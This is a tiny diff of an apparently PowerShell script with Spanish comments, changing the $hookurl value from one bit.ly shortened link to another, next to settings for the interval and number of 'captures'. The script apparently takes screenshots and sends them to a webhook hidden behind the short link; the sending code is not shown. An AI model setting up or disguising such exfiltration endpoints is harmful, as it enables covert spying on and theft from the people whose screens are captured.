@@ -1,4 +1,4 @@
-$hookurl = "https://bit.ly/web_chupakbras"
+$hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 1 # Cantidad de capturas
 
